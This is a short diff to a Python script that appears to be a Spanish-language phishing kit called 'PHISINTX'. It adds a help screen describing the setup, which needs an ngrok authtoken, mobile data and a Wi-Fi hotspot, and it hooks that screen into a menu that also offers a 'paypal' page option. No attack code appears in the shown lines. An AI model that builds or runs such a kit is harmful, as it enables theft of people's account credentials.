@@ -94,6 +94,25 @@ def incorrecto():
 ╚══════╝ ╚════╝    ╚═╝   ╚═╝  ╚═╝{color.fin}""")
     time.sleep(4)
 
+def ayuda():
+ banner()
+ contacto()
+ print(f"""
+
+  {color.morado} PHISINTX{color.verde}
+
+[✓]  HERRAMIENTA CREADA CON FINES EDUCATIVOS.
+
+[✓]  NECESARIO TENER PUESTO EL AUTOTOKEN EN NROK
+
+[✓]  SOLONFUNCIONA CON DATOS
+
+[✓]  HAY QUE ACTIVAR EL PUNTO DE ACCESO WIFI
+
+""")
+ input(f"{color.cyan} PULSA CUALQUIER TECLA PARA CONTINUAR >>>{color.fin}")
+ inicio()
+
 def pagina(ph):
  banner()
  contacto()
@@ -153,7 +172,7 @@ def inicio():
  elif eleccion == "4":
   pagina("paypal")
  elif eleccion == "5":
-  pass
+  ayuda()
  elif eleccion =="0":
   os.system("clear")
   exit()
